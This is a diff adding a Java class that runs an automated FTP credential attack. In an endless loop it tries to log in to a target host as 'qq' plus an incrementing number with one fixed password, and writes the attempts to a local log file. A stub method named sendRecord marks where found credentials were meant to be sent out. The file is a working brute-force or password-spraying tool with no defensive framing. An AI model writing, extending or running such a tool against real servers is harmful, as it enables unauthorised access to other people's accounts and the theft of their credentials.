@@ -1,0 +1,82 @@
+package com.robin;
+
+import java.io.IOException;
+import java.net.SocketException;
+import org.apache.commons.net.ftp.FTPClient;
+
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileWriter;
+
+
+class goFtp extends Ftp {
+	public goFtp(int _port, String _host, String _password, int _user) {
+		super(_port, _host, _password, _user);
+	}
+
+	@Override
+	public void goLogin() {
+		FTPClient ftp = new FTPClient();
+		while (true) {
+			try {
+				ftp.connect(this.host, this.port);
+				if (ftp.login("qq" + Integer.toString(this.user), this.password) == true) {
+					loginWin();
+				} else {
+					// System.out.println("登录失败");
+					setRecord();
+				}
+			} catch (SocketException e) {
+				System.out.println("登录失败");
+				setRecord();
+			} catch (IOException e) {
+				System.out.println("host错误");
+				setRecord();
+			}
+			this.user++;
+			System.out.println(this.user);
+		}
+	}
+
+	/*
+	 * 登录成功后的操作: 记录>发送记录
+	 */
+	@Override
+	public void loginWin() {
+		System.out.println("登录成功:\n账号:" + this.user + "\n密码" + this.password + "\n");
+		setRecord();
+		sendRecord();
+	}
+
+	/*
+	 * 写入log.txt>如果文件不存在就新建>然后写入文件
+	 */
+	@Override
+	public void setRecord() {
+		File file = new File("D:\\javaobj\\javaMaven\\src\\main\\java\\com\\robin\\log.txt");
+		// System.out.println(System.getProperty("user.dir"));
+		if (file.exists() == false) {
+			try {
+				file.createNewFile();
+				System.out.println("新建log.txt成功");
+			} catch (IOException e) {
+				System.out.println("新建log.txt失败");
+			}
+		}
+		try {
+			FileWriter fw = new FileWriter(file, true);
+			BufferedWriter bw = new BufferedWriter(fw);
+			bw.write(Integer.toString(this.user) + "   " + this.password + "\r\n");
+			bw.close();
+		} catch (IOException e) {
+			System.out.println("写入log.txt失败");
+		}
+
+	}
+
+	@Override
+	public void sendRecord() {
+		System.out.println("发送成功!");
+	}
+
+}
